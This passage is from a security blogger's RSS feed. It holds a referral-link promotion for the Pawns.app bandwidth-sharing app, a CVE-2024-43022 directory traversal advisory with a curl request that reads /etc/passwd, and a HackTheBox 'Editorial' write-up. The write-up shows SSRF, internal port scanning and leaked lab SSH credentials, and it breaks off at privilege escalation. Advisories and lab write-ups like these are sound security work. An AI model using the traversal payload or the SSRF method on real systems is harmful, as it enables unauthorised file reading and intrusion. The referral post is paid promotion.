&lt;p&gt;&lt;img src=&quot;/images/2024-09-14-how-to-make-a-breakfast-money-with-pawns-app/image-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;get-started-by-pawnsapp&quot;&gt;&lt;strong&gt;Get Started by Pawns.app&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Thus far, I have shared my personal experiences and insights.&lt;br /&gt;
Now, how can you get involved? This is likely the primary concern for many individuals.&lt;/p&gt;

&lt;p&gt;I recommend downloading and installing the app, but the first step is always to register an &lt;a href=&quot;https://pawns.app/?r=1865228&quot;&gt;Pawns.app&lt;/a&gt; account. Utilizing the app is remarkably straightforward. It features a clean and intuitive interface that guides users through each step of the setup process. You do not need to be a technology expert to operate it, even those who are not particularly tech-savvy will find it exceedingly user-friendly.&lt;/p&gt;

&lt;p&gt;If you are a technical person like me, and you are using Linux, you can also choose to run the application on the command line terminal. Yes, &lt;a href=&quot;https://pawns.app/?r=1865228&quot;&gt;Pawns.app&lt;/a&gt; also supports running on Liunx.&lt;/p&gt;

&lt;p&gt;If you follow the app’s guided process but still feel confused, you might want to refer to this official article: “&lt;a href=&quot;https://pawns.app/blog/how-to-start-using-pawns-app/&quot;&gt;How to Start Using Pawns.app In 2024&lt;/a&gt;”.&lt;/p&gt;

&lt;p&gt;Why not give it a shot?&lt;br /&gt;
Instead of letting your internet sit idle, why not make it work for you?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://pawns.app/?r=1865228&quot; target=&quot;_blank&quot;&gt;
&lt;img src=&quot;https://cdn.pawns.app/images/b/728.jpg&quot; alt=&quot;Pawns.app&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It won’t make you rich overnight, it’s a great way to earn some extra pocket money with minimal effort. If you’re looking for an easy way to boost your income,   &lt;a href=&quot;https://pawns.app/?r=1865228&quot;&gt;Pawns.app&lt;/a&gt; is definitely worth trying!&lt;/p&gt;

&lt;p&gt;OK, That’s all for my share.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;One more thing,&lt;br /&gt;
this content is free, but there are referral links included in the article.&lt;/p&gt;

&lt;p&gt;If you register a new &lt;a href=&quot;https://pawns.app/?r=1865228&quot;&gt;Pawns.app&lt;/a&gt; account using these links, you’ll receive a total of $3 in bonuses. You’ll get a $1 bonus when you start using &lt;a href=&quot;https://pawns.app/?r=1865228&quot;&gt;Pawns.app&lt;/a&gt;, and an additional $1 bonus on each of your first and second payouts.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://pawns.app/?r=1865228&quot; target=&quot;_blank&quot;&gt;
&lt;img src=&quot;https://cdn.pawns.app/images/b/630.jpg&quot; alt=&quot;Pawns.app&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;By using these links, you’ll also be supporting my work, which means a lot to me.&lt;/p&gt;

&lt;p&gt;Thank you so much for reading and considering it!&lt;/p&gt;
</description>
        <pubDate>Sat, 14 Sep 2024 06:26:00 +0800</pubDate>
        <link>https://b0rgch3n.github.io/2024/09/14/how-to-make-a-breakfast-money-with-pawns-app/</link>
        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/09/14/how-to-make-a-breakfast-money-with-pawns-app/</guid>
        
        <category>Passive Income</category>
        
        
      </item>
    
      <item>
        <title>CVE-2024-43022 Vulnerability Report</title>
        <description>&lt;p&gt;Analysis of &lt;strong&gt;CVE-2024-43022&lt;/strong&gt; Directory Traversal Vulnerability,&lt;br /&gt;
impacting versions 4.02, 4.03 and 4.04.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;product-description&quot;&gt;&lt;strong&gt;Product Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;“&lt;strong&gt;TOSEIネット店舗管理システム&lt;/strong&gt;” is an online management system for self-service washing machines developed by TOSEI Corporation, offering features like configuration, monitoring, reporting, alerts, and settlement.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;affected-products&quot;&gt;&lt;strong&gt;Affected Products&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Version: 4.02 ~ 4.03&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;risk-information&quot;&gt;&lt;strong&gt;Risk Information&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;CVSS v3&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Base Score: 7.5&lt;/li&gt;
  &lt;li&gt;Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&lt;/li&gt;
  &lt;li&gt;Severity: High&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-11-cve-2024-43022_directory_traversal_vulnerability_analysis/image-1.png&quot; alt=&quot;CVE-2024-43022 tenable report&quot; /&gt;
  &lt;em&gt;infomations from tenable&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;vulnerability-summary&quot;&gt;&lt;strong&gt;Vulnerability Summary&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Directory traversal vulnerability allows &lt;strong&gt;unauthenticated&lt;/strong&gt; attackers to &lt;strong&gt;read arbitrary files&lt;/strong&gt; on the server through &lt;strong&gt;downloader.php&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;proof-of-concept&quot;&gt;&lt;strong&gt;Proof Of Concept&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;From the &lt;strong&gt;downloader.php&lt;/strong&gt; page, an unauthenticated attacker can manipulate the &lt;strong&gt;GET&lt;/strong&gt; parameter &lt;strong&gt;file&lt;/strong&gt; to a relative path to read any file on the system.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl http://xxx/cgi-bin/downloader.php?file&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../etc/passwd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-11-cve-2024-43022_directory_traversal_vulnerability_analysis/image-2.jpg&quot; alt=&quot;CVE-2024-43022 proof of concept&quot; /&gt;
  &lt;em&gt;Proof of concept&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;remediation&quot;&gt;&lt;strong&gt;Remediation&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Strengthen validation rules by ensuring input contains only alphanumeric characters and the “.” symbol. Other symbols should not be allowed.&lt;/p&gt;

&lt;p&gt;As a best practice, it is recommended to use a whitelist of allowed values.&lt;/p&gt;

&lt;p&gt;For more details, please refer to the following link: &lt;a href=&quot;https://cwe.mitre.org/data/definitions/22.html&quot;&gt;CWE-22&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;vulnerable-devices-found&quot;&gt;&lt;strong&gt;Vulnerable Devices Found&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;As of 11 Sep 2024, there were 870 vulnerable devices exposed to the internet and were affected by the vulnerabilities discovered.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-11-cve-2024-43022_directory_traversal_vulnerability_analysis/image-3.png&quot; alt=&quot;CVE-2024-43022 vulnerable devices&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 11 Sep 2024 14:01:00 +0800</pubDate>
        <link>https://b0rgch3n.github.io/2024/09/11/cve-2024-43022_directory_traversal_vulnerability_analysis/</link>
        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/09/11/cve-2024-43022_directory_traversal_vulnerability_analysis/</guid>
        
        <category>CVE</category>
        
        <category>Vulnerability Analysis</category>
        
        
      </item>
    
      <item>
        <title>[WriteUp] HackTheBox - Editorial</title>
        <description>&lt;p&gt;&lt;strong&gt;Editorial&lt;/strong&gt; is a simple difficulty box on HackTheBox.&lt;br /&gt;
It is also the &lt;strong&gt;OSCP like&lt;/strong&gt; box in the &lt;a href=&quot;https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#&quot;&gt;NetSecFocus Trophy Room list by TJ Null&lt;/a&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;As usual, we start by enumerating with &lt;strong&gt;Nmap&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-1.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;Nmap scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;Nmap&lt;/strong&gt; scan report shows open ports &lt;strong&gt;22&lt;/strong&gt; and &lt;strong&gt;80&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;As you know, the SSH service on port 22 is never the first choice.&lt;br /&gt;
Let’s check the Web service on port &lt;strong&gt;80&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-2.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Simultaneously,&lt;br /&gt;
we use &lt;strong&gt;dirsearch&lt;/strong&gt; for web directory enumeration and &lt;strong&gt;ffuf&lt;/strong&gt; for subdomain enumeration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-3.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dirsearch scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-4.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;ffuf scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Web directory enumeration revealed something interesting: “&lt;strong&gt;/upload&lt;/strong&gt;”,&lt;br /&gt;
while subdomain enumeration returned nothing.&lt;/p&gt;

&lt;h2 id=&quot;foothold&quot;&gt;&lt;strong&gt;Foothold&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Let’s closely inspect the “&lt;strong&gt;/upload&lt;/strong&gt;” page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-5.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It appears to be a page for uploading book files.&lt;/p&gt;

&lt;p&gt;The input box on the top left is for providing a link to the book cover,&lt;br /&gt;
and the one on the top right is for selecting the file to upload.&lt;/p&gt;

&lt;p&gt;Notice the “&lt;strong&gt;Preview&lt;/strong&gt;” button on the far right!&lt;/p&gt;

&lt;p&gt;This preview feature seems to request the link provided in the top left input box.&lt;br /&gt;
Let’s test by modifying the “&lt;strong&gt;bookurl&lt;/strong&gt;” parameter to a text file using &lt;strong&gt;Burpsuite&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-6.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;burpsuite: testing ssrf&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;By accessing the returned preview link,&lt;br /&gt;
we can confirm that the preview feature has an &lt;strong&gt;SSRF&lt;/strong&gt; vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-7.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;burpsuite: testing ssrf&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;A major use of &lt;strong&gt;SSRF&lt;/strong&gt; vulnerabilities is internal network scanning.&lt;/p&gt;

&lt;p&gt;Next, we use &lt;strong&gt;Nmap Top1k List&lt;/strong&gt; as the port list to enumerate internal ports.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-8.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;burpsuite: brute-force&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-9.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;burpsuite: brute-force&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;By filtering the results, we found a local service on port &lt;strong&gt;5000&lt;/strong&gt;,&lt;br /&gt;
and it is an API service.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-10.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;burpsuite: testing ssrf&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-11.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;burpsuite: testing ssrf&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Let’s format and inspect the API information.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;promotions&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Retrieve a list of all the promotions in our library.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/api/latest/metadata/messages/promos&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;coupons&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Retrieve the list of coupons to use in our library.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/api/latest/metadata/messages/coupons&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;new_authors&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Retrieve the welcome message sended to our new authors.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/api/latest/metadata/messages/authors&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;platform_use&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Retrieve examples of how to use the platform.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/api/latest/metadata/messages/how_to_use_platform&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;changelog&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Retrieve a list of all the versions and updates of the api.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/api/latest/metadata/changelog&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;latest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Retrieve the last version of api.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;endpoint&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/api/latest/metadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;methods&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Access each of the above API paths,&lt;br /&gt;
only “&lt;strong&gt;/api/latest/metadata/messages/authors&lt;/strong&gt;” is accessible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-12.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;burpsuite: testing ssrf&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-13.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;burpsuite: testing ssrf&lt;/em&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;template_mail_message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Welcome to the team! We are thrilled to have you on board and can&apos;t wait to see the incredible content you&apos;ll bring to the table.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Your login credentials for our internal forum and authors site are:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Username: dev&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Password: dev080217_devAPI!@&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Please be sure to change your password as soon as possible for security purposes.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Don&apos;t hesitate to reach out if you have any questions or ideas - we&apos;re always here to support you.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Best regards, Editorial Tiempo Arriba Team.&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This API leaks credentials: user “&lt;strong&gt;dev&lt;/strong&gt;” and password “&lt;strong&gt;dev080217_devAPI!@&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;Use these credentials to log in to the SSH service.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-14.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;get shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Successfully logged in and gained a shell as the &lt;strong&gt;dev&lt;/strong&gt; user.&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Next, let’s escalate privileges.&lt;/p&gt;

&lt;p&gt;In the “&lt;strong&gt;/home/dev/app&lt;/strong&gt;” directory, there’s a local &lt;strong&gt;git&lt;/strong&gt; repository. Let’s check the &lt;strong&gt;git&lt;/strong&gt; logs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-15.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;git logs&lt;/em&gt;&lt;/p&gt;

